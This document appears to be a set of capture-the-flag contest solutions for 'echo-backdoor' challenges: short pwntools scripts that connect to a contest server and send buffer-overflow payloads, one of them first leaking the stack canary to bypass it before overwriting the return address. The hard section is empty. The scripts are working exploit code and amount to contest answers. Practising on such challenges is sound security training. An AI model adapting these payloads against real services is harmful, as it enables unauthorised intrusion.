-------------------------echo-backdoor-easy-------------------------

from pwn import *  
  
  
conn = remote("95.164.38.230", 33000)  
conn.sendline(b"1" * 40 + p64(0x401166))  
  
conn.interactive()




-------------------------echo-backdoor-medium-------------------------

from pwn import *  
  
conn = remote("95.164.38.230", 33001)  
  
conn.sendline(b'a' * 40)  
print(conn.recv(40))  
conn.sendline(b'a')  
print(conn.recvline())  
canary = int(conn.recvline()[:-3][::-1].hex(), 16) << 8  
conn.sendline(b'a' * 40 + p64(canary) + b'a' * 8 + p64(0x401176))  
conn.sendline(b'pl34s3_tr1gg3r_b4ckd00r')  
  
conn.interactive()


-------------------------echo-backdoor-hard-------------------------





[[Контесты]]